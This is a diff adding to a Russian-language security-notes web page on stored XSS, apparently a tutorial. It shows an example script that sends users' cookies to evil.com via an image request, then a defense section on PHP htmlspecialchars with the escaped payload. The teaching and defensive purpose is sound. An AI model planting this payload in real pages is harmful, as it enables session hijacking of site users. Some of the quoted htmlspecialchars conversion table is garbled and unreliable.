@@ -29,6 +29,32 @@
 <p>Суть хранимой XSS заключается в том, что бэкэнд сохраняет на сервере необработанные данные полученные от пользователя и в дальнейшем не обрабатывает их.
 Таким образом вредоносный html\JavaScript код сохраняется на веб сервере и в дальнейшем обрабатывается браузерами пользователей.</p>
 <h3><a id='example'></a> <a href="#example">Пример уязвимости</a></h3>
+<p>Злоумышленник опубликовал запись в на крупном ресурсе в которой встроили js который отправляет на его сервер куки пользователя.</p>
+<pre><code class="language-html">&lt;script&gt;
+    var img = document.createElement('img');
+    img.src = 'http://evil.com/cookies?data'+encodeURI(document.cookie);
+    document.body.appendChild(img);
+&lt;/script&gt;</code></pre>
+<p>Таким образом злоумышленник получит кукисы всех пользователей которые увидят его запись.
+Все просто.</p>
+<h3><a id="protection"></a> <a href="#protection">Защита</a></h3>
+<p>Необходимо всегда фильтровать данные полученные из вне.
+В php есть замечательная функция <a href="http://php.net/manual/ru/function.htmlspecialchars.php">htmlspecialchars</a> которая поможет спастись от xss атак.</p>
+<blockquote>
+<p>htmlspecialchars — Преобразует специальные символы в HTML-сущности
+Производятся следующие преобразования:
+'&amp;' (амперсанд) преобразуется в '&amp;'
+'&quot;' (двойная кавычка) преобразуется в '&quot;' в режиме ENT_NOQUOTES is not set.
+&quot;'&quot; (одиночная кавычка) преобразуется в '&#039;' (или &apos;) только в режиме ENT_QUOTES.
+'&lt;' (знак &quot;меньше чем&quot;) преобразуется в '&lt;'
+'&gt;' (знак &quot;больше чем&quot;) преобразуется в '&gt;'</p>
+</blockquote>
+<p>Таким образом, при использовании функции <code>htmlspecialchars</code> приведенный выше код будет преобразован в </p>
+<pre><code class="language-html">&amp;lt;script&amp;gt;
+    var img = document.createElement('img');
+    img.src = 'http://evil.com/cookies?data'+encodeURI(document.cookie);
+    document.body.appendChild(img);
+&amp;lt;/script&amp;gt;</code></pre>
 
                 <footer class="site-footer">
                     <span class="site-footer-owner"><a href="https://github.com/DmitryNaum/securityNotes">Security Notes</a> is maintained by <a href="https://github.com/DmitryNaum">DmitryNaum</a>.</span>
